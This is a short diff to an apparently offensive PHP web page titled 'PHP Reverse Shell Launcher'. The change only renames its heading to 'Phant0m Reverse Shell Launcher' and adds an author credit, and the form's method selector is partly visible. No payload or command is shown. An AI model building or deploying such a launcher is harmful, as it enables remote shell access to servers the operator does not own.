@@ -46,7 +46,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <title>PHP Reverse Shell Launcher</title>
 </head>
 <body style="background:#ffffff; color:#000000; font-family:monospace; padding:2em;">
-    <h2>Reverse Shell Launcher</h2>
+    <h1>Phant0m Reverse Shell Launcher</h1>
+    <p>Uhhukk by: andknownmaly</p>
     <form method="POST">
         <label>Method:
             <select name="method">
